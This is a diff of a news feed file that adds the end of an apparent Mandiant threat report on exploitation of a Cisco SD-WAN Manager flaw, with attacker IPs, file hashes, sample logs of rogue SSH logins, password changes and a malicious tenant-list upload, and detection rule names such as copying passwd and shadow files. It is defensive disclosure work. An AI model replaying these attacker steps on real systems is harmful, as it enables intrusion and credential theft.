+&lt;div style="color: #5f6368; width: 100%;"&gt;&lt;table border="1px" cellpadding="16px" style="border-collapse: collapse; width: 100%;"&gt;&lt;colgroup&gt;&lt;col /&gt;&lt;col /&gt;&lt;/colgroup&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p style="text-align: center;"&gt;&lt;strong style="vertical-align: baseline;"&gt;Description&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p style="text-align: center;"&gt;&lt;strong style="vertical-align: baseline;"&gt;Indicator&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;IP address connecting as rogue device and exploiting CVE-2026-20245&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;126.51.108[.]152&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;IP address connecting as rogue device&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;76.92.245[.]217&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;IP address connecting as rogue device&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;207.190.37[.]94&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;IP address connecting as rogue device&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;23.245.7[.]178&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;IP address connecting as rogue device&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;153.186.231[.]233&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;IP address connecting as rogue device&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;167.179.79[.]189&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;IP address connecting as rogue device&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;45.32.38[.]160&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;IP address connecting as rogue device&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;209.137.225[.]101&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;File Indicators&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Due to the threat actor's extensive anti-forensic cleanup, several files associated with this intrusion were overwritten or deleted. However, forensic remnants of the malicious CSV payload were recovered.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;div align="left"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;&lt;table&gt;&lt;colgroup&gt;&lt;col /&gt;&lt;col /&gt;&lt;col /&gt;&lt;/colgroup&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p style="text-align: center;"&gt;&lt;strong style="vertical-align: baseline;"&gt;Filename&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p style="text-align: center;"&gt;&lt;strong style="vertical-align: baseline;"&gt;Description&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p style="text-align: center;"&gt;&lt;strong style="vertical-align: baseline;"&gt;SHA256&lt;/strong&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;/home/admin/.orig_vbond_vsmart_tenant_list&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Backup configuration file&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Not recovered&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;/home/admin/.orig_vbond_vsmart_tenant_list.state&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;State file&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Not recovered&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;/home/admin/.orig_passwd&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Backup password file&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Not recovered&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;/home/admin/.orig_shadow&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Backup password file&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Not recovered&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;/home/admin/evil_tenant.csv&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Remnant of malicious CSV file exploiting CVE-2026-20245&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;b82936f37648518425c7d3cf9e09eaffa41d7cdb3840f6a40287e3a108880f7b&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Detections and Hunting&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Mandiant encourages organizations to conduct proactive threat hunts focused on the tactics, techniques, and procedures (TTPs) outlined in this report to identify activity that may otherwise blend into routine operations. Because certain indicators of compromises may mirror legitimate administrative actions, it is critical to assess these observations against the established network posture to minimize false positives.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;As per Cisco’s guidance, any suspicious activity or confirmed IOCs should be forwarded to the Cisco TAC for comprehensive review and assistance.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Unauthorized SSH Connections as &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;vmanage-admin&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Monitor authentication logs (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/var/log/auth.log&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) for logins originating from unexpected external IP addresses using the vmanage-admin user account.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;Jan 01 07:58:00 vManage sshd[20766]: Accepted publickey for vmanage-admin from &amp;lt;Threat Actor IP&amp;gt; port 48373 ssh2: RSA SHA256:&amp;lt;redacted&amp;gt;
+Jan 01 08:01:00 vManage sshd[25178]: Accepted keyboard-interactive/pam for admin from &amp;lt;Threat Actor IP&amp;gt; port 60552 ssh2&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 5: SSH from unexpected origins&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h4 style="text-align: justify;"&gt;&lt;span style="vertical-align: baseline;"&gt;Suspicious Password Change Events&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Audit password changes in &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/var/log/auth.log&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; targeting the admin account in quick succession, particularly where credentials are set and subsequently reverted.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;Jan 01 08:00:00 vManage usermod[12345]: change user 'admin' password
+Jan 01 08:15:00 vManage usermod[12345]: change user 'admin' password&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 6: Password changes&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Defenders should also inspect rollback files present within &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/var/confd/rollback/&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; for configuration delta commits targeting user passwords:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;# Created by: vmanage-admin
+# Date: 2026-01-01 08:00:00
+# Via: netconf
+# Type: delta
+# Label: 
+# Comment: 
+# No: 10000
+# TransactionId: 12345678
+# Hostname: vManage
+
+system {
+    aaa {
+        user admin {
+password &amp;lt;redacted&amp;gt;;
+        }
+     }
+ }&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 7: Rollback files&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h4 style="text-align: justify;"&gt;&lt;span style="vertical-align: baseline;"&gt;Suspicious Execution of the &lt;code&gt;su&lt;/code&gt; Command&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Audit terminal command history and system logs (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/var/log/auth.log&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) for successful switch user (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;su&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) executions from the admin account to unauthorized accounts (e.g., &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;troot&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;).&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;Jan 01 08:03:00 vManage su[24289]: Successful su for troot by admin&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 8: &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;su&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; logins&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h4 style="text-align: justify;"&gt;&lt;span style="vertical-align: baseline;"&gt;Exploitation of CVE-2026-20245&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Monitor script logs (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/var/log/scripts.log&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) for execution anomalies involving unauthorized execution of &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;vconfd_script_upload_tenant_list.sh&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;Jan 01 08:01:05 vManage vScript: Tenant list upload per vsmart serial number: /usr/bin/vconfd_script_upload_tenant_list.sh -cli path /home/admin/evil_tenant.csv vpn 0
+Jan 01 08:01:05 vManage vScript: uploading tenant list via VPN 0 true
+Jan 01 08:01:05 vManage vScript: Copying ... /home/admin/evil_tenant.csv via VPN 0
+Jan 01 08:01:05 vManage vScript: Successfully loaded the tenant placement file&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 9: Execution anomalies&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Defenders can also query active command execution history using show history within the Viptela CLI for the specific administrative upload commands:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;01-01 08:01:05 -- request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 10: Command execution&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Google Security Operations (SecOps)&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Google SecOps customers have access to these broad category rules and more under the Mandiant Intel Emerging Threats rule pack. The activity discussed in the blog post is detected in Google SecOps under the rule names:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Privileged Account Append to Passwd Database&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Grep Privileged User Account Discovery in Passwd or Shadow&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Hidden Backup of Sensitive System Files&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Suspicious Copy from Usr Share to User Hidden Directory&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Acknowledgements&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Mandiant would like to thank the Cisco Product Security Incident Response Team (PSIRT) for their collaboration and partnership throughout the coordinated disclosure process.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;</content>
+    <link href="https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager/"/>
+    <category term="Google Cloud"/>
+    <published>2026-06-24T11:00:00+00:00</published>
+  </entry>
   <entry>
     <id>https://blog.google/innovation-and-ai/technology/research/helping-communities-prepare-for-natural-disasters/</id>
     <title>Towards a world where no one is surprised by a natural disaster</title>
@@ -17088,23 +17558,5 @@ enhance their site's performance in Google Search.
     <link href="https://research.google/blog/accelerating-the-magic-cycle-of-research-breakthroughs-and-real-world-applications/"/>
     <category term="Google Research"/>
     <published>2025-10-31T07:40:00+00:00</published>
-  </entry>
-  <entry>
-    <id>https://research.google/blog/toward-provably-private-insights-into-ai-use/</id>
-    <title>Toward provably private insights into AI use</title>
-    <updated>2025-10-30T10:56:00+00:00</updated>
-    <content type="html">Generative AI</content>
-    <link href="https://research.google/blog/toward-provably-private-insights-into-ai-use/"/>
-    <category term="Google Research"/>
-    <published>2025-10-30T10:56:00+00:00</published>
-  </entry>
-  <entry>
-    <id>https://research.google/blog/streetreaderai-towards-making-street-view-accessible-via-context-aware-multimodal-ai/</id>
-    <title>StreetReaderAI: Towards making street view accessible via context-aware multimodal AI</title>
-    <updated>2025-10-29T16:38:00+00:00</updated>
-    <content type="html">Generative AI</content>
-    <link href="https://research.google/blog/streetreaderai-towards-making-street-view-accessible-via-context-aware-multimodal-ai/"/>
-    <category term="Google Research"/>
-    <published>2025-10-29T16:38:00+00:00</published>
   </entry>
 </feed>
